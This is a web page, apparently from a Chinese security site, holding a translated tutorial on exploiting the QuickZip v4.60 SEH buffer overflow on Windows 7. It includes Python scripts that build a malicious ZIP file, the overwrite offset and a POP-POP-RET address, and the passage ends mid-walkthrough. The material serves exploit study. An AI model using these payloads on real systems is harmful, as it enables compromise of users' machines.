@@ -1,0 +1,951 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】QuickZip V4.60 缓冲区溢出漏洞详解 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="漏洞分析,缓冲区溢出漏洞分析,QuickZip漏洞"/>
+    
+        <meta name="description" content="本文将为大家详细介绍QuickZip v4.60缓冲区溢出漏洞方面的知识。由于漏洞在2010年就出现了，所以之前PoC的设计仅适用于32位Windows XP。所以，我决定尝试在64位Windows 7上重现该漏洞，这将是一个有趣的挑战！
+"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】QuickZip V4.60 缓冲区溢出漏洞详解</h2>
+                <div class="article-msg">
+                    <span class="time">2017-05-11 10:12:31</span>
+                    
+                                        <span class="read">阅读：10380次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3839"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3839" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://blog.knapsy.com/blog/2015/11/25/easy-file-sharing-web-server-v7-dot-2-remote-seh-buffer-overflow-dep-bypass-with-rop/"
+                             target="_blank">来源： knapsy.com</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei"><img src="http://p9.qhimg.com/t019718f44041c29677.jpg" title="t019718f44041c29677.jpg" alt="http://p9.qhimg.com/t019718f44041c29677.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_blank" textvalue="shan66"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; color: rgb(0, 112, 192);"><strong>shan66</strong></span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; word-break: break-all; text-indent: 2em; background-color: rgb(255, 255, 255);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><span style="font-size: 18px;">预估稿费：300RMB</span></span></strong></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family:微软雅黑, Microsoft YaHei">前言</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(227, 108, 9);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本文将为读者详细介绍QuickZip v4.60缓冲区溢出漏洞方面的知识。</span></strong></span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">由于漏洞在2010年就出现了，所以它的设计仅适用于32位Windows XP。所以，我决定尝试在64位Windows 7上重现该漏洞，这将是一个（有趣的）挑战！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">PoC</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">为此，我从exploit-db中抓取了QuickZip v4.60 Windows XP漏洞，并将用它创建了一个简单的PoC来触发崩溃。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+header_1&nbsp;=&nbsp;(&quot;\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00&quot;)
+header_2&nbsp;=&nbsp;(&quot;\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00&quot;
+&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;)
+header_3&nbsp;=&nbsp;(&quot;\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00&quot;
+&quot;\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00&quot;)
+print&nbsp;&quot;[+]&nbsp;Building&nbsp;PoC..&quot;
+max_size&nbsp;=&nbsp;4064
+payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;max_size
+payload&nbsp;+=&nbsp;&quot;.txt&quot;
+print&nbsp;&quot;[+]&nbsp;Length&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(len(payload))
+exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3
+mefile&nbsp;=&nbsp;open(&#39;cst.zip&#39;,&#39;w&#39;);
+mefile.write(exploit);
+mefile.close()
+print&nbsp;&quot;[+]&nbsp;Exploit&nbsp;complete!&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">上述代码创建了一个压缩文件，其中只包含一个名为4064A的文件，它的扩展名为“.txt”。 Header_1，header_2和header_3是ZIP文件结构所需的标题。 我不会详细介绍，但您可以在这里阅读更多。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果您在QuickZip中打开刚创建的ZIP文件，并尝试提取其内容（或只需双击文件名），那么QuickZip就会崩溃。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">了解崩溃详情</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">好的，我们来运行PoC，看看到底发生了什么。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用上面的Python脚本创建ZIP文件，使用QuickZip打开它，启动ImmunityDebugger，附加到QuickZip进程，并在QuickZip中双击文件名以触发崩溃。 注意：我们将不断重复这个过程！&nbsp;</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01e0cc47b1edd46a51.png" title="t01964235e21fa70832.png" alt="http://p0.qhimg.com/t01964235e21fa70832.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很好，崩溃如期而至。 另外，这里出现了一个异常，屏幕底部可以看到“Access violation when writing to [00190000]”。 这意味着我们试图写入一个无效的内存地址，从而触发了一个异常。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下面，我们来研究一下SEH链。&nbsp;</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t015386f8f3cce684c6.png" title="t01f85183e0434ced57.png" alt="http://p4.qhimg.com/t01f85183e0434ced57.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">很好，看来我们能够控制nSEH指针！下面，我们尝试算出偏移量。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">偏移量&nbsp;</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">一如既往，我要借助mona（</span><a href="https://github.com/corelan/mona" _src="https://github.com/corelan/mona" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">https://github.com/corelan/mona</a><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">&nbsp;）来完成许多工作。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，我们生成一个4064个独特字符的模版，并将其放在PoC漏洞利用代码的有效载荷中：&nbsp;</span></p><pre class="brush:plain;toolbar:false">!mona&nbsp;pc&nbsp;4064</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">再次触发崩溃，看看会发生什么情况。</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01c3290e8e33c81139.png" title="t01e7cd7d2e7d069d8b.png" alt="http://p4.qhimg.com/t01e7cd7d2e7d069d8b.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">呃，崩溃看起来有点不同。 这里的问题是LEAVE指令尝试从堆栈跳回到0EEDFADE地址，不过这里是该程序的无效内存地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此外，似乎我们无法控制SEH了。</span></p><p style="text-align:center"><img src="http://p6.qhimg.com/t019059240af6cf2e73.png" title="t01a4c842870066b6df.png" alt="http://p9.qhimg.com/t01a4c842870066b6df.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">但是，请注意，我们实际上是在内核模块中（请看Immunity窗口的名称：“CPU - main thread, module KERNELBA”）。 使用SHIFT + F9将执行权传回给程序，看看是否触发另一个异常，但是是在QuickZip模块中。</span></p><p style="text-align:center"><img src="http://p4.qhimg.com/t010383bc80201de6ab.png" title="t01e2c42667f230ff9b.png" alt="http://p7.qhimg.com/t01e2c42667f230ff9b.png"/></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01d3d1b6a6f36f0050.png" title="t0116e5792d898e31db.png" alt="http://p2.qhimg.com/t0116e5792d898e31db.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">真棒，看起来成功了！</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用以下命令让mona计算所有偏移量：</span></p><pre class="brush:plain;toolbar:false">！mona&nbsp;findmsp</pre><p style="text-align:center"><img src="http://p9.qhimg.com/t019eebd2574a5c32a4.png" title="t013c26fbe479c6886f.png" alt="http://p1.qhimg.com/t013c26fbe479c6886f.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在这里，我们最感兴趣的偏移是nSEH field: offset 292。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们用偏移信息更新PoC，并尝试再次触发崩溃。&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/python
+header_1&nbsp;=&nbsp;(&quot;\x50\x4B\x03\x04\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00&quot;)
+header_2&nbsp;=&nbsp;(&quot;\x50\x4B\x01\x02\x14\x00\x14\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00&quot;
+&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe4\x0f\x00\x00\x00\x00\x00\x00\x01\x00&quot;
+&quot;\x24\x00\x00\x00\x00\x00\x00\x00&quot;)
+header_3&nbsp;=&nbsp;(&quot;\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00&quot;
+&quot;\x12\x10\x00\x00\x02\x10\x00\x00\x00\x00&quot;)
+print&nbsp;&quot;[+]&nbsp;Building&nbsp;PoC..&quot;
+max_size&nbsp;=&nbsp;4064
+nseh_offset&nbsp;=&nbsp;292
+payload&nbsp;=&nbsp;&quot;A&quot;&nbsp;*&nbsp;nseh_offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;BBBB&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;nSEH
+payload&nbsp;+=&nbsp;&quot;CCCC&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;SEH
+payload&nbsp;+=&nbsp;&quot;A&quot;&nbsp;*&nbsp;(max_size&nbsp;-&nbsp;len(payload))&nbsp;&nbsp;&nbsp;#&nbsp;padding&nbsp;for&nbsp;the&nbsp;rest&nbsp;of&nbsp;payload
+payload&nbsp;+=&nbsp;&quot;.txt&quot;
+print&nbsp;&quot;[+]&nbsp;Length&nbsp;=&nbsp;&quot;&nbsp;+&nbsp;str(len(payload))
+exploit&nbsp;=&nbsp;header_1&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_2&nbsp;+&nbsp;payload&nbsp;+&nbsp;header_3
+mefile&nbsp;=&nbsp;open(&#39;cst.zip&#39;,&#39;w&#39;);
+mefile.write(exploit);
+mefile.close()
+print&nbsp;&quot;[+]&nbsp;Exploit&nbsp;complete!&quot;</pre><p style="text-align:center"><img src="http://p2.qhimg.com/t0171a9250022c9c463.png" title="t014161d98cfdacc249.png" alt="http://p3.qhimg.com/t014161d98cfdacc249.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">太好了，我们控制了SEH！让我们将异常传给程序（SHIFT + F9），并进一步调查发生了什么。</span></p><p style="text-align:center"><img src="http://p3.qhimg.com/t016f6c609fa7726a69.png" title="t011e69c77877861fc3.png" alt="http://p3.qhimg.com/t011e69c77877861fc3.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当然，另外一个异常也被触发，因为43434343是这个程序的无效内存地址，但是让我们看看堆栈上到底发生了什么——通常是SEH溢出，我们需要调用一组POP-POP-RET指令来返回到缓冲区。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">找到这样的指令是很容易的，但首先，我们必须知道允许使用哪些字符。这就是我们需要关注的下一个问题。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">坏字符</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">总的来说，大部分是这样的。为什么？因为我们的溢出是针对filename参数的，而文件名用到的字符类型是相当有限的： 通常只有ASCII可打印的字符。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果使用手动方式的话，那么使用mona通过遍历方法找到所有坏的字符将需要太长的时间，所以这里简单假设除了0x00、0x0a和0x0d（分别代表NULL、换行和回车）之外，我可以使用ASCII表中所有的字符（最高值为0x7F的字符）。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个假设可能会比事情比实际情况要更困难（因为我需要避免使用实际可以使用的字符）一些，或者可能会导致更多的问题，如果我的假设范围内的某些字符其实是错误的话。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我不喜欢这样做假设，但为了进行这个练习，这里例外一次。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我只需要记住，要格外小心，如果有情况，则需要再次检查坏的字符。这有点冒险，但很好玩，继续！&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">POP-POP-RET</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">让我们通过mona来寻找一个易于使用的POP-POP-RET指令：</span></p><pre class="brush:plain;toolbar:false">！mona&nbsp;seh</pre><p style="text-align:center"><img src="http://p0.qhimg.com/t01ccd901c6d21a2383.png" title="t019cb03e7d1b55625d.png" alt="http://p3.qhimg.com/t019cb03e7d1b55625d.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里找到很多结果（7909！），但突出显示的结果看起来最有希望——全部由字母数字字符组成，位于QuickZip.exe二进制文件本身中，有望使其更具跨平台特性，因为我们不希望依赖特定的操作系统DLL。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里唯一的问题是0x00字节，但是由于程序的地址空间的原因，每个地址都以0x00开头，所以我们来尝试一下，看看是否会影响我们的漏洞利用代码。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">更新PoC漏洞利用代码，用\ x33 \ x28 \ x42 \ x00替换目前代表SEH的CCCC，再次触发崩溃并考察SEH链。&nbsp;</span></p><p style="text-align:center"><img src="http://p9.qhimg.com/t01a61ffb8c5632d2f0.png" title="t010453d5f32a2dd2f5.png" alt="http://p2.qhimg.com/t010453d5f32a2dd2f5.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">好的，看起来我们的地址没有乱码，跟我们的预期相符。 设置断点（F2），然后按SHIFT + F9将控制权传递给程序。</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t01f9060034fced1add.png" title="t01a667544f69ff538a.png" alt="http://p4.qhimg.com/t01a667544f69ff538a.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如您所见，我们将重定向到POP-POP-RET指令，让我们用F8进行操作，并在RETN 4指令之后停止。</span></p><p style="text-align:center"><img src="http://p2.qhimg.com/t01dbf4eb3cb82298d1.png" title="t01b9e127acbd07dfcb.png" alt="http://p1.qhimg.com/t01b9e127acbd07dfcb.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">真棒，我们已经进入有效载荷...但有一个问题：因为NULL字节的缘故，SEH链之后的所有东西都被切断了，所以没有给我们太多的空间做任何事情。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 